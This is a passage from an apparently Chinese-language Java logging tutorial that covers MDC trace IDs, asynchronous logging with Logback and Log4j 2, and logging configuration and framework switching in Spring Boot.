class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>在 Spring Boot 中注册 Filter</strong>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.boot.web.servlet.FilterRegistrationBean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WebConfig</span> &#123;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> FilterRegistrationBean&lt;TraceIdFilter&gt; <span class="title function_">traceIdFilter</span><span class="params">()</span> &#123;</span><br><span class="line">        FilterRegistrationBean&lt;TraceIdFilter&gt; registrationBean = <span class="keyword">new</span> <span class="title class_">FilterRegistrationBean</span>&lt;&gt;();</span><br><span class="line">        registrationBean.setFilter(<span class="keyword">new</span> <span class="title class_">TraceIdFilter</span>());</span><br><span class="line">        registrationBean.addUrlPatterns(<span class="string">&quot;/*&quot;</span>); <span class="comment">// 应用于所有请求</span></span><br><span class="line">        registrationBean.setOrder(<span class="number">1</span>); <span class="comment">// 设置过滤器顺序</span></span><br><span class="line">        <span class="keyword">return</span> registrationBean;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<hr>
<h4 id="4-5-3-在日志配置中使用-MDC"><a href="#4-5-3-在日志配置中使用-MDC" class="headerlink" title="4.5.3 在日志配置中使用 MDC"></a>4.5.3 在日志配置中使用 MDC</h4><p>设置好 MDC 后，还需要修改日志配置文件（如 <code>logback.xml</code>），告诉日志框架在输出时从 MDC 中提取信息。这通过 <code>%X{key}</code> 占位符实现。</p>
<p><strong><code>logback.xml</code> 配置示例：</strong></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">appender</span> <span class="attr">name</span>=<span class="string">&quot;CONSOLE&quot;</span> <span class="attr">class</span>=<span class="string">&quot;ch.qos.logback.core.ConsoleAppender&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">encoder</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 在格式中加入 [%X&#123;traceId&#125;] --&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- `:-` 表示如果 traceId 不存在，则打印一个横线，避免空白 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">pattern</span>&gt;</span>%d&#123;HH:mm:ss.SSS&#125; [%thread] %-5level %logger&#123;36&#125; [%X&#123;traceId:-&#125;] - %msg%n<span class="tag">&lt;/<span class="name">pattern</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">encoder</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">appender</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">root</span> <span class="attr">level</span>=<span class="string">&quot;INFO&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">&quot;CONSOLE&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>最终日志输出效果：</strong></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">10:30:00.123 [http-nio-8080-exec-1] INFO  c.m.s.OrderService [a1b2c3d4e5f6] - Processing order...</span><br><span class="line">10:30:00.456 [http-nio-8080-exec-1] INFO  c.m.d.InventoryDao [a1b2c3d4e5f6] - Checking inventory for product P1...</span><br></pre></td></tr></table></figure>

<p>可以看到，同一个请求的所有日志都带上了相同的 <code>traceId</code> <code>[a1b2c3d4e5f6]</code>。</p>
<p><strong>注意：</strong> 标准的 MDC 是基于 <code>ThreadLocal</code> 实现的，因此它<strong>不会自动跨线程传播</strong>。如果你在代码中使用了异步操作（如 <code>CompletableFuture.runAsync()</code> 或 <code>@Async</code>），需要额外处理才能将 MDC 上下文传递到子线程中。</p>
<hr>
<h3 id="4-6-异步日志"><a href="#4-6-异步日志" class="headerlink" title="4.6 异步日志"></a>4.6 异步日志</h3><p>默认情况下，日志记录是一个<strong>同步阻塞</strong>操作。当你的代码调用 <code>logger.info(&quot;some message&quot;)</code> 时，执行该代码的线程（通常是处理业务逻辑的主线程）必须<strong>等待</strong>日志框架完成整个日志事件的处理流程——包括格式化消息、应用过滤器、并将最终结果写入磁盘文件或发送到网络。在 IO 操作密集时，这会成为应用的性能瓶颈。</p>
<p>异步日志的核心思想就是<strong>解耦</strong>：将<strong>日志事件的产生</strong>（在业务线程中）与<strong>日志事件的处理和输出</strong>（在专用的日志后台线程中）分离开来。</p>
<h4 id="4-6-1-优点：提升应用吞吐量与响应速度"><a href="#4-6-1-优点：提升应用吞吐量与响应速度" class="headerlink" title="4.6.1 优点：提升应用吞吐量与响应速度"></a><strong>4.6.1 优点：提升应用吞吐量与响应速度</strong></h4><p>引入异步日志带来的最大好处是显著提升应用性能，尤其是在高并发场景下。</p>
<ul>
<li><strong>提升应用吞吐量</strong>：业务线程调用 <code>logger.info()</code> 时，不再需要等待耗时的 IO 操作。它只需将日志事件（一个轻量级的对象）放入一个内存中的队列（或缓冲区），然后就可以立即返回，继续执行后续的业务逻辑。这大大减少了业务线程的等待时间，从而提高了单位时间内可以处理的请求数量。</li>
<li><strong>减少对主业务线程的影响</strong>：日志写入的磁盘抖动、网络延迟等 IO 波动，将不会直接影响到主业务线程的执行。这使得应用的响应时间更加平滑和可预测，减少了长尾请求（long-tail latencies）的出现。</li>
</ul>
<p><strong>工作流程对比：</strong></p>
<ul>
<li><strong>同步日志</strong>：<br><code>业务线程: logger.info() -&gt; [格式化 -&gt; 过滤 -&gt; 写入磁盘] -&gt; 返回</code></li>
<li><strong>异步日志</strong>：<br><code>业务线程: logger.info() -&gt; [放入内存队列] -&gt; (立即)返回</code><br><code>后台日志线程: [从队列取出] -&gt; [格式化 -&gt; 过滤 -&gt; 写入磁盘]</code></li>
</ul>
<h4 id="4-6-2-实现方式"><a href="#4-6-2-实现方式" class="headerlink" title="4.6.2 实现方式"></a><strong>4.6.2 实现方式</strong></h4><p>不同的日志框架提供了不同的异步实现机制。</p>
<p><strong>1. Logback 的 <code>AsyncAppender</code></strong></p>
<p><code>AsyncAppender</code> 是 Logback 中实现异步日志的方式。它像一个“代理”或“包装器”，包裹住一个或多个其他的“真实”Appender（如 <code>FileAppender</code>）。</p>
<ul>
<li><p><strong>工作原理</strong>：<br><code>AsyncAppender</code> 内部维护了一个 <code>BlockingQueue</code>（阻塞队列）。当业务线程产生日志时，<code>AsyncAppender</code> 将日志事件放入队列中。一个专门的后台工作线程会不断地从队列中取出事件，然后分发给被它包裹的真实 Appender 进行处理。</p>
</li>
<li><p><strong>配置示例 (<code>logback.xml</code>)</strong>:</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 1. 定义一个真实的 FileAppender --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">appender</span> <span class="attr">name</span>=<span class="string">&quot;FILE&quot;</span> <span class="attr">class</span>=<span class="string">&quot;ch.qos.logback.core.FileAppender&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">file</span>&gt;</span>app.log<span class="tag">&lt;/<span class="name">file</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">encoder</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">pattern</span>&gt;</span>%d %-5level [%thread] %logger&#123;36&#125; - %msg%n<span class="tag">&lt;/<span class="name">pattern</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">encoder</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">appender</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 2. 定义 AsyncAppender，并引用真实的 Appender --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">appender</span> <span class="attr">name</span>=<span class="string">&quot;ASYNC&quot;</span> <span class="attr">class</span>=<span class="string">&quot;ch.qos.logback.classic.AsyncAppender&quot;</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 队列深度，当队列满时，默认会丢弃 TRACE, DEBUG, INFO 级别的日志 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">queueSize</span>&gt;</span>512<span class="tag">&lt;/<span class="name">queueSize</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 从不阻塞业务线程，即使队列满了也直接丢弃日志 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">neverBlock</span>&gt;</span>true<span class="tag">&lt;/<span class="name">neverBlock</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 将日志事件分发给 FILE Appender --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">&quot;FILE&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">appender</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">root</span> <span class="attr">level</span>=<span class="string">&quot;INFO&quot;</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 3. 让 root logger 使用 AsyncAppender --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">&quot;ASYNC&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p><strong>2. Log4j 2 的异步 Logger (性能更优)</strong></p>
<p>Log4j 2 提供了更彻底、性能更高的异步实现，因为它可以在 Logger 层面就实现异步，而不仅仅是在 Appender 层面。这被称为**“前端异步”**。</p>
<ul>
<li><p><strong>工作原理</strong>：<br>Log4j 2 的异步 Logger 使用了高性能的无锁并发库 <strong>LMAX Disruptor</strong>。当调用 logger 方法时，它直接将日志数据发布到 Disruptor 的 RingBuffer 中，几乎没有锁竞争，开销极低。这比基于 <code>BlockingQueue</code> 的 <code>AsyncAppender</code> 性能更高。</p>
</li>
<li><p><strong>实现方式</strong>：<br>a. <strong>添加 Disruptor 依赖</strong>：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.lmax<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>disruptor<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.4.4<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>b. <strong>开启异步模式</strong>：</p>
<ul>
<li><strong>全局异步 (All Loggers Async)</strong>：最简单也最强大的方式。只需在 classpath 的 <code>log4j2.component.properties</code> 文件中或通过 JVM 系统属性设置 <code>Log4jContextSelector</code>。<br><strong>JVM 参数</strong>: <code>-DLog4jContextSelector=org.apache.logging.log4j.core.async.AsyncLoggerContextSelector</code></li>
<li><strong>部分异步 (Mixed Sync and Async)</strong>：在 <code>log4j2.xml</code> 中，可以将特定的 <code>&lt;Logger&gt;</code> 或 <code>&lt;Root&gt;</code> 配置为异步。</li>
</ul>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 混合模式配置示例 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Loggers</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 这个 logger 是异步的 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">AsyncLogger</span> <span class="attr">name</span>=<span class="string">&quot;com.mycompany.service&quot;</span> <span class="attr">level</span>=<span class="string">&quot;debug&quot;</span> <span class="attr">additivity</span>=<span class="string">&quot;false&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">AppenderRef</span> <span class="attr">ref</span>=<span class="string">&quot;MyFile&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">AsyncLogger</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- root logger 保持同步 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Root</span> <span class="attr">level</span>=<span class="string">&quot;info&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">AppenderRef</span> <span class="attr">ref</span>=<span class="string">&quot;Console&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Loggers</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="4-6-3-权衡：日志丢失的风险"><a href="#4-6-3-权衡：日志丢失的风险" class="headerlink" title="4.6.3 权衡：日志丢失的风险"></a><strong>4.6.3 权衡：日志丢失的风险</strong></h4><p>异步日志并非没有代价，其最主要的权衡点在于<strong>可能丢失少量日志</strong>。</p>
<ul>
<li><strong>原因</strong>：日志事件被放入内存队列后，业务线程就认为日志记录已完成。但此时日志事件仍在内存中，尚未被后台线程写入磁盘。如果此时应用程序<strong>异常崩溃</strong>或被<strong>强制杀死 (kill -9)</strong>，那么内存队列中所有未处理的日志事件都将<strong>永久丢失</strong>。</li>
<li><strong>风险评估</strong>：<ul>
<li>对于绝大多数应用场景，丢失应用崩溃前最后几毫秒的日志是可以接受的。通过异步日志换来的巨大性能提升，其价值远高于这点微小的风险。</li>
<li>对于银行交易、支付等需要<strong>绝对保证每一条审计日志都不能丢失</strong>的极端场景，可能需要使用同步日志，或者配合其他更可靠的数据持久化方案。</li>
</ul>
</li>
<li><strong>优雅关闭 (Graceful Shutdown)</strong>：<br>为了最大限度地减少日志丢失，日志框架支持“优雅关闭”。当应用正常关闭时（例如，Spring Boot 应用接收到关闭信号），日志框架会确保在 JVM 退出前，将异步队列中的所有日志事件都处理完毕。<strong>只有在异常崩溃或强制终止的情况下，才会发生日志丢失。</strong></li>
</ul>
<hr>
<h2 id="5-在-Spring-Boot-中使用日志"><a href="#5-在-Spring-Boot-中使用日志" class="headerlink" title="5. 在 Spring Boot 中使用日志"></a>5. 在 Spring Boot 中使用日志</h2><p>Spring Boot 遵循“约定优于配置”的原则，对日志功能提供了开箱即用的强大支持。它不仅内置了默认的日志栈，还提供了极为便捷的配置方式。</p>
<h4 id="5-1-默认日志栈：SLF4J-Logback"><a href="#5-1-默认日志栈：SLF4J-Logback" class="headerlink" title="5.1 默认日志栈：SLF4J + Logback"></a>5.1 默认日志栈：<code>SLF4J + Logback</code></h4><p>当引入任何一个标准的 Spring Boot Starter（如 <code>spring-boot-starter-web</code>）时，它会默认传递性地引入 <code>spring-boot-starter-logging</code>。这个 Starter 为你预配置了以下日志体系：</p>
<ul>
<li><strong>门面</strong>：<strong>SLF4J</strong></li>
<li><strong>实现</strong>：<strong>Logback</strong></li>
</ul>
<p>这意味着，无需任何额外配置，就可以在 Spring Boot 应用中直接使用 SLF4J 的 API 来记录日志，并且所有日志都会由 Logback 负责处理。这套组合稳定、高效且功能强大，是绝大多数项目的最佳选择。</p>
<hr>
<h4 id="5-2-快速配置"><a href="#5-2-快速配置" class="headerlink" title="5.2 快速配置"></a>5.2 快速配置</h4><p>对于大部分常见的配置需求，根本不需要编写 XML 文件。Spring Boot 允许你在 <code>application.properties</code> 或 <code>application.yml</code> 中通过简单的键值对来快速配置日志。</p>
<ul>
<li><strong>配置日志级别</strong>：<code>logging.level.&lt;logger-name&gt;=&lt;level&gt;</code><ul>
<li><code>&lt;logger-name&gt;</code> 可以是具体的包名、类名，或者是 <code>root</code>（代表根 Logger）。</li>
</ul>
</li>
<li><strong>配置日志文件</strong>：<ul>
<li><code>logging.file.name</code>: 指定日志文件的<strong>完整路径和名称</strong>。例如 <code>logging.file.name=myapp.log</code> 会在项目根目录下生成 <code>myapp.log</code>。</li>
<li><code>logging.file.path</code>: 指定日志文件存放的<strong>目录</strong>。Spring Boot 会在该目录下创建一个名为 <code>spring.log</code> 的文件。</li>
</ul>
</li>
</ul>
<p><strong>示例 (<code>application.yml</code>):</strong></p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">logging:</span></span><br><span class="line">  <span class="comment"># 设置根日志级别为 WARN</span></span><br><span class="line">  <span class="attr">level:</span></span><br><span class="line">    <span class="attr">root:</span> <span class="string">WARN</span></span><br><span class="line">    <span class="comment"># 为我们自己的项目包开启 DEBUG 级别</span></span><br><span class="line">    <span class="attr">com.mycompany.project:</span> <span class="string">DEBUG</span></span><br><span class="line">    <span class="comment"># 为 Hibernate SQL 日志开启 DEBUG，方便开发时查看 SQL</span></span><br><span class="line">    <span class="attr">org.hibernate.SQL:</span> <span class="string">DEBUG</span></span><br><span class="line">    </span><br><span class="line">  <span class="comment"># 配置日志输出到文件</span></span><br><span class="line">  <span class="attr">file:</span></span><br><span class="line">    <span class="comment"># 文件名，可以包含路径</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">/var/log/my-app/application.log</span></span><br><span class="line">    </span><br><span class="line">  <span class="comment"># 自定义控制台和文件的输出格式</span></span><br><span class="line">  <span class="attr">pattern:</span></span><br><span class="line">    <span class="attr">console:</span> <span class="string">&quot;%d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125; [%thread] %-5level %logger&#123;36&#125; - %msg%n&quot;</span></span><br><span class="line">    <span class="attr">file:</span> <span class="string">&quot;%d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125; [%thread] %-5level %logger&#123;50&#125; - %msg%n&quot;</span></span><br></pre></td></tr></table></figure>

<hr>
<h4 id="5-3-自定义配置"><a href="#5-3-自定义配置" class="headerlink" title="5.3 自定义配置"></a>5.3 自定义配置</h4><p>当 <code>application.yml</code> 的配置无法满足复杂需求时（例如，需要配置多个 Appender、使用 Filter、或根据环境切换输出目标），你可以提供一个自定义的日志配置文件。Spring Boot 会自动检测并加载它。</p>
<ul>
<li><strong>推荐文件名</strong>：<code>logback-spring.xml</code><ul>
<li>Spring Boot 推荐使用这个名字（而不是 <code>logback.xml</code>）。因为 <code>-spring</code> 后缀让 Spring Boot 能够为该文件提供一些<strong>增强功能</strong>。</li>
</ul>
</li>
<li><strong>Spring Boot 提供的扩展功能</strong>：<ul>
<li><strong><code>&lt;springProfile&gt;</code> 标签</strong>：允许根据当前激活的 Spring Profile (如 <code>dev</code>, <code>test</code>, <code>prod</code>) 来定义不同的日志配置。这是实现环境隔离日志策略的绝佳方式。</li>
<li><strong><code>&lt;springProperty&gt;</code> 标签</strong>：可以在 <code>logback-spring.xml</code> 中直接引用 <code>application.yml</code> 中定义的属性。</li>
</ul>
</li>
</ul>
<p><strong>示例 (<code>logback-spring.xml</code>)</strong></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 引入 Spring Boot 的默认配置，可以复用其基础设置 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">include</span> <span class="attr">resource</span>=<span class="string">&quot;org/springframework/boot/logging/logback/base.xml&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 开发环境: 日志级别更低，只输出到控制台 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">springProfile</span> <span class="attr">name</span>=<span class="string">&quot;dev&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">logger</span> <span class="attr">name</span>=<span class="string">&quot;com.mycompany.project&quot;</span> <span class="attr">level</span>=<span class="string">&quot;DEBUG&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">springProfile</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 生产环境: 日志级别更高，并添加滚动文件输出 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">springProfile</span> <span class="attr">name</span>=<span class="string">&quot;prod&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">appender</span> <span class="attr">name</span>=<span class="string">&quot;ROLLING_FILE&quot;</span> <span class="attr">class</span>=<span class="string">&quot;ch.qos.logback.core.rolling.RollingFileAppender&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">file</span>&gt;</span>/var/log/my-app/prod.log<span class="tag">&lt;/<span class="name">file</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">rollingPolicy</span> <span class="attr">class</span>=<span class="string">&quot;ch.qos.logback.core.rolling.TimeBasedRollingPolicy&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">fileNamePattern</span>&gt;</span>/var/log/my-app/prod.%d&#123;yyyy-MM-dd&#125;.log<span class="tag">&lt;/<span class="name">fileNamePattern</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">maxHistory</span>&gt;</span>30<span class="tag">&lt;/<span class="name">maxHistory</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">rollingPolicy</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">encoder</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">pattern</span>&gt;</span>%d %-5level [%thread] %logger&#123;36&#125; - %msg%n<span class="tag">&lt;/<span class="name">pattern</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">encoder</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">appender</span>&gt;</span></span><br><span class="line">        </span><br><span class="line">        <span class="tag">&lt;<span class="name">root</span> <span class="attr">level</span>=<span class="string">&quot;INFO&quot;</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 生产环境同时输出到控制台和文件 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">&quot;CONSOLE&quot;</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">&quot;ROLLING_FILE&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">springProfile</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>

<hr>
<h4 id="5-4-切换日志实现"><a href="#5-4-切换日志实现" class="headerlink" title="5.4 切换日志实现"></a>5.4 切换日志实现</h4><p>如果你希望使用 Log4j 2 来替代默认的 Logback（例如，为了追求极致的异步性能），Spring Boot 也提供了简单的切换方式。</p>
<p><strong>切换步骤 (以 Maven 为例):</strong></p>
<ol>
<li>在你的 <code>pom.xml</code> 中，找到 <code>spring-boot-starter-web</code> (或任何其他包含 logging 的 starter) 的依赖。</li>
<li>使用 <code>&lt;exclusions&gt;</code> 标签<strong>排除</strong>掉默认的 <code>spring-boot-starter-logging</code>。</li>
<li>添加新的依赖 <code>spring-boot-starter-log4j2</code>。</li>
</ol>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">exclusions</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-logging<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">exclusions</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 引入 Log4j 2 的 starter --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-log4j2<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>完成以上步骤后，Spring Boot 将会自动配置 <code>SLF4J + Log4j 2</code> 的组合。此时，如果你需要自定义配置，应该在 classpath 下创建名为 <code>log4j2-spring.xml</code> 的文件。</p>
<hr>
<h2 id="6-选型建议与总结"><a href="#6-选型建议与总结" class="headerlink" title="6. 选型建议与总结"></a>6. 选型建议与总结</h2><p>在众多的日志框架中，如何做出正确的选择？以下是基于现代 Java 后端开发的通用建议。</p>
<h4 id="6-1-新项目推荐"><a href="#6-1-新项目推荐" class="headerlink" title="6.1 新项目推荐"></a>6.1 新项目推荐</h4><ul>
<li><strong>首选：<code>SLF4J + Logback</code></strong><ul>
